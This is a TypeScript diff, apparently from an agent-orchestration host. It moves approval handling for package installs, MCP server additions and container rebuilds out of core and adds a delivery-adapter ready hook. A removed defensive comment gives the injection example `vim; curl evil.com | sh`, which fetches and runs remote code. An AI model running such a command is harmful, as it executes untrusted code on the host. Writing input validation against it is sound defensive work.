@@ -12,18 +12,11 @@ import fs from 'fs';
 import path from 'path';
 
 import { GROUPS_DIR } from './config.js';
-import {
-  getRunningSessions,
-  getActiveSessions,
-  createPendingQuestion,
-  getSession,
-  createPendingApproval,
-} from './db/sessions.js';
+import { getRunningSessions, getActiveSessions, createPendingQuestion, getSession } from './db/sessions.js';
 import { getAgentGroup, createAgentGroup, updateAgentGroup, getAgentGroupByFolder } from './db/agent-groups.js';
 import { createDestination, getDestinationByName, hasDestination, normalizeName } from './db/agent-destinations.js';
 import { getDb, hasTable } from './db/connection.js';
-import { getMessagingGroup, getMessagingGroupByPlatform } from './db/messaging-groups.js';
-import { pickApprovalDelivery, pickApprover } from './access.js';
+import { getMessagingGroupByPlatform } from './db/messaging-groups.js';
 import {
   getDueOutboundMessages,
   getDeliveredIds,
@@ -37,7 +30,7 @@ import {
   updateTask,
 } from './db/session-db.js';
 import { log } from './log.js';
-import { normalizeOptions, type RawOption } from './channels/ask-question.js';
+import { normalizeOptions } from './channels/ask-question.js';
 import {
   openInboundDb,
   openOutboundDb,
@@ -90,11 +83,43 @@ let deliveryAdapter: ChannelDeliveryAdapter | null = null;
 let activePolling = false;
 let sweepPolling = false;
 
+/**
+ * Callbacks fired when the delivery adapter is first set (and again if it's
+ * replaced). Lets modules that need the adapter at boot (e.g. approvals →
+ * OneCLI handler) hook in without core calling into the module directly.
+ *
+ * Not a general-purpose registry — narrow lifecycle hook only.
+ */
+type AdapterReadyCallback = (adapter: ChannelDeliveryAdapter) => void | Promise<void>;
+const adapterReadyCallbacks: AdapterReadyCallback[] = [];
+
+/** Current delivery adapter or null if not yet set. Modules use this in live
+ *  message-flow handlers where the adapter is guaranteed to be set. For
+ *  boot-time setup (before the adapter is ready), use onDeliveryAdapterReady. */
+export function getDeliveryAdapter(): ChannelDeliveryAdapter | null {
+  return deliveryAdapter;
+}
+
+export function onDeliveryAdapterReady(cb: AdapterReadyCallback): void {
+  adapterReadyCallbacks.push(cb);
+  if (deliveryAdapter) {
+    // Already set — fire immediately so late registrations still run.
+    void Promise.resolve()
+      .then(() => cb(deliveryAdapter as ChannelDeliveryAdapter))
+      .catch((err) => log.error('onDeliveryAdapterReady callback threw', { err }));
+  }
+}
+
 export function setDeliveryAdapter(adapter: ChannelDeliveryAdapter): void {
   deliveryAdapter = adapter;
   // Forward to the typing module so it can fire setTyping on its own
   // interval. Direct call, not a registry — typing is a default module.
   setTypingAdapter(adapter);
+  for (const cb of adapterReadyCallbacks) {
+    void Promise.resolve()
+      .then(() => cb(adapter))
+      .catch((err) => log.error('onDeliveryAdapterReady callback threw', { err }));
+  }
 }
 
 /**
@@ -118,82 +143,6 @@ function notifyAgent(session: Session, text: string): void {
   if (fresh) {
     wakeContainer(fresh).catch((err) => log.error('Failed to wake container after notification', { err }));
   }
-}
-
-/**
- * Send an approval request to a privileged user's DM and record a
- * pending_approval row. Routing: admin @ originating agent group → owner.
- * Tie-break: prefer an approver reachable on the same channel kind as the
- * originating session's messaging group. Delivery always lands in the
- * approver's DM (not the origin group), regardless of where the action
- * was triggered.
- */
-const APPROVAL_OPTIONS: RawOption[] = [
-  { label: 'Approve', selectedLabel: '✅ Approved', value: 'approve' },
-  { label: 'Reject', selectedLabel: '❌ Rejected', value: 'reject' },
-];
-
-async function requestApproval(
-  session: Session,
-  agentName: string,
-  action: 'install_packages' | 'request_rebuild' | 'add_mcp_server',
-  payload: Record<string, unknown>,
-  title: string,
-  question: string,
-): Promise<void> {
-  const approvers = pickApprover(session.agent_group_id);
-  if (approvers.length === 0) {
-    notifyAgent(session, `${action} failed: no owner or admin configured to approve.`);
-    return;
-  }
-
-  // Origin channel kind drives the tie-break preference in approval delivery.
-  const originChannelType = session.messaging_group_id
-    ? (getMessagingGroup(session.messaging_group_id)?.channel_type ?? '')
-    : '';
-
-  const target = await pickApprovalDelivery(approvers, originChannelType);
-  if (!target) {
-    notifyAgent(session, `${action} failed: no DM channel found for any eligible approver.`);
-    return;
-  }
-
-  const approvalId = `appr-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
-  const normalizedOptions = normalizeOptions(APPROVAL_OPTIONS);
-  createPendingApproval({
-    approval_id: approvalId,
-    session_id: session.id,
-    request_id: approvalId, // fire-and-forget: no separate request id to correlate
-    action,
-    payload: JSON.stringify(payload),
-    created_at: new Date().toISOString(),
-    title,
-    options_json: JSON.stringify(normalizedOptions),
-  });
-
-  if (deliveryAdapter) {
-    try {
-      await deliveryAdapter.deliver(
-        target.messagingGroup.channel_type,
-        target.messagingGroup.platform_id,
-        null,
-        'chat-sdk',
-        JSON.stringify({
-          type: 'ask_question',
-          questionId: approvalId,
-          title,
-          question,
-          options: APPROVAL_OPTIONS,
-        }),
-      );
-    } catch (err) {
-      log.error('Failed to deliver approval card', { action, approvalId, err });
-      notifyAgent(session, `${action} failed: could not deliver approval request to ${target.userId}.`);
-      return;
-    }
-  }
-
-  log.info('Approval requested', { action, approvalId, agentName, approver: target.userId });
 }
 
 /** Start the active container poll loop (~1s). */
@@ -702,102 +651,6 @@ async function handleSystemAction(
       log.info('Agent group created', { agentGroupId, name, localName, folder, parent: sourceGroup.id });
       // Note: requestId is unused — this is fire-and-forget, not request/response.
       void requestId;
-      break;
-    }
-
-    case 'add_mcp_server': {
-      const agentGroup = getAgentGroup(session.agent_group_id);
-      if (!agentGroup) {
-        notifyAgent(session, 'add_mcp_server failed: agent group not found.');
-        break;
-      }
-      const serverName = content.name as string;
-      const command = content.command as string;
-      if (!serverName || !command) {
-        notifyAgent(session, 'add_mcp_server failed: name and command are required.');
-        break;
-      }
-      await requestApproval(
-        session,
-        agentGroup.name,
-        'add_mcp_server',
-        {
-          name: serverName,
-          command,
-          args: (content.args as string[]) || [],
-          env: (content.env as Record<string, string>) || {},
-        },
-        'Add MCP Request',
-        `Agent "${agentGroup.name}" is attempting to add a new MCP server:\n${serverName} (${command})`,
-      );
-      break;
-    }
-
-    case 'install_packages': {
-      const agentGroup = getAgentGroup(session.agent_group_id);
-      if (!agentGroup) {
-        notifyAgent(session, 'install_packages failed: agent group not found.');
-        break;
-      }
-
-      const apt = (content.apt as string[]) || [];
-      const npm = (content.npm as string[]) || [];
-      const reason = (content.reason as string) || '';
-
-      // Host-side sanitization (defense in depth — container should validate first).
-      // Strict allowlist: Debian/npm naming rules only. Blocks shell injection via
-      // package names like `vim; curl evil.com | sh`.
-      const APT_RE = /^[a-z0-9][a-z0-9._+-]*$/;
-      const NPM_RE = /^(@[a-z0-9][a-z0-9._-]*\/)?[a-z0-9][a-z0-9._-]*$/;
-      const MAX_PACKAGES = 20;
-      if (apt.length + npm.length === 0) {
-        notifyAgent(session, 'install_packages failed: at least one apt or npm package is required.');
-        break;
-      }
-      if (apt.length + npm.length > MAX_PACKAGES) {
-        notifyAgent(session, `install_packages failed: max ${MAX_PACKAGES} packages per request.`);
-        break;
-      }
-      const invalidApt = apt.find((p) => !APT_RE.test(p));
-      if (invalidApt) {
-        notifyAgent(session, `install_packages failed: invalid apt package name "${invalidApt}".`);
-        log.warn('install_packages: invalid apt package rejected', { pkg: invalidApt });
-        break;
-      }
-      const invalidNpm = npm.find((p) => !NPM_RE.test(p));
-      if (invalidNpm) {
-        notifyAgent(session, `install_packages failed: invalid npm package name "${invalidNpm}".`);
-        log.warn('install_packages: invalid npm package rejected', { pkg: invalidNpm });
-        break;
-      }
-
-      const packageList = [...apt.map((p) => `apt: ${p}`), ...npm.map((p) => `npm: ${p}`)].join(', ');
-      await requestApproval(
-        session,
-        agentGroup.name,
-        'install_packages',
-        { apt, npm, reason },
-        'Install Packages Request',
-        `Agent "${agentGroup.name}" is attempting to install a package + rebuild container:\n${packageList}${reason ? `\nReason: ${reason}` : ''}`,
-      );
-      break;
-    }
-
-    case 'request_rebuild': {
-      const agentGroup = getAgentGroup(session.agent_group_id);
-      if (!agentGroup) {
-        notifyAgent(session, 'request_rebuild failed: agent group not found.');
-        break;
-      }
-      const reason = (content.reason as string) || '';
-      await requestApproval(
-        session,
-        agentGroup.name,
-        'request_rebuild',
-        { reason },
-        'Rebuild Request',
-        `Agent "${agentGroup.name}" is attempting to rebuild container.${reason ? `\nReason: ${reason}` : ''}`,
-      );
       break;
     }
 
